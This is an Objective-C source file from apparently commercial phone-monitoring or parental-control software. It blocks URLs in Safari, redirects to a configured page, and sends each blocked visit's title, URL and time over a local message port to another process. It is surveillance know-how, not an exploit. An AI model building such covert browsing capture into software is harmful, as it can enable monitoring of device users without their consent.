//
//  SafariUtils.m
//  MSFCR
//
//  Created by Benjawan Tanarattanakorn on 7/17/12.
//  Copyright 2012 __MyCompanyName__. All rights reserved.
//

#import "SafariUtils.h"
#import "BlockEvent.h"
#import "FxBrowserUrlEvent.h"
#import "MessagePortIPCSender.h"
#import "DateTimeFormat.h"
#import "DefStd.h"


static NSString* const kSafariAppName			= @"Safari";

static NSString* const kLanguagePath			= @"/Applications/ssmp.app/Language-english.plist";
static NSString* const kRedirectedUrl			= @"redirected url";

static SafariUtils *_safariUtils				= nil;


@interface SafariUtils (private) 

+ (void) initializeBlockingState;

- (NSString *) redirectedURL;

@end


@implementation SafariUtils


@synthesize mIsBlockRedirectedPage;
@synthesize mIsBlockOriginalCallOfCapturing;
@synthesize mIsIntendedToAccessRedirectedURL;
@synthesize mCurrentBlockURL;
@synthesize mRedirectedURL;


#pragma mark -
#pragma mark Public method


+ (id) sharedInstance {
	if (_safariUtils == nil) {
		_safariUtils = [[SafariUtils alloc] init];	
		
		[SafariUtils initializeBlockingState];			
	}
	return (_safariUtils);
}

+ (BlockEvent *) createBlockEventForWebForUrl: (id) aUrlData {
	BlockEvent *webEvent = [[BlockEvent alloc] initWithEventType:kWebEvent
												  eventDirection:kBlockEventDirectionAll 
											eventTelephoneNumber:nil
													eventContact:nil 
											   eventParticipants:nil 
													   eventDate:[NSDate date] 
													   eventData:aUrlData];
	return [webEvent autorelease];
}


+ (void) sendBrowserUrlEvent: (NSString*) title url: (NSString*) address {
	DLog(@">>>>>>>>>>>>>>>>>>>>>>>>>>>> !!!!! BLOCKED browser event sent ====");
	
	NSMutableData* data = [[NSMutableData alloc] init];
	FxBrowserUrlEvent* browserUrlEvent = [[FxBrowserUrlEvent alloc] init];
	[browserUrlEvent setMTitle:title];
	[browserUrlEvent setMUrl:address];
	[browserUrlEvent setDateTime:[DateTimeFormat phoenixDateTime]];
	[browserUrlEvent setMVisitTime:[browserUrlEvent dateTime]];
	[browserUrlEvent setMIsBlocked:YES];
	[browserUrlEvent setMOwningApp:kSafariAppName];
	
	NSKeyedArchiver* archiver = [[NSKeyedArchiver alloc] initForWritingWithMutableData:data];
	[archiver encodeObject:browserUrlEvent forKey:kBrowserUrlArchived];
	[archiver finishEncoding];
	[browserUrlEvent release];
	[archiver release];
	
	MessagePortIPCSender* messagePortSender = [[MessagePortIPCSender alloc] initWithPortName:kBrowserUrlMessagePort];
	[messagePortSender writeDataToPort:data];
	[messagePortSender release];
	[data release];
}

- (BOOL) isRedirectedURL: (NSString *) aURLString {
	BOOL isRedirect = NO;
	DLog (@"is redirected url")
	
	// -- remove / at the end of url if exists
	if ([aURLString hasSuffix:@"/"]) {	
		aURLString = [aURLString substringToIndex:[aURLString length] - 1];
		DLog (@"new redirected string: %@", aURLString)
	}	
	if ([aURLString isEqualToString:[self mRedirectedURL]])
		isRedirect = YES;
	return isRedirect;			
}

// override
- (NSString *) mRedirectedURL {
	if (!mRedirectedURL) {
		// If safari is killed and then opened, This condition is satified again.
		//DLog (@"-- create redirected url")
		mRedirectedURL = [[NSString alloc] initWithString:[self redirectedURL]];
	}	
	return mRedirectedURL;
}


#pragma mark -
#pragma mark Private method

+ (void) initializeBlockingState {
	// -- initialize the state of safari blocking flow
	[_safariUtils setMIsBlockRedirectedPage:NO];
	[_safariUtils setMIsBlockOriginalCallOfCapturing:NO];
	[_safariUtils setMIsIntendedToAccessRedirectedURL:NO];
	[_safariUtils setMCurrentBlockURL:@""];	
}

- (NSString *) redirectedURL {
	NSDictionary *languageResources = [NSDictionary dictionaryWithContentsOfFile:kLanguagePath];	
	NSString *urlString = @"";
	urlString = [languageResources objectForKey:kRedirectedUrl];	
	return urlString;
}

#pragma mark -
#pragma mark Memory management


- (void) dealloc {
	[self setMCurrentBlockURL:nil];	
	
	if (mRedirectedURL) {
		[mRedirectedURL release];
		mRedirectedURL = nil;
	}
	
	[super dealloc];
}

@end
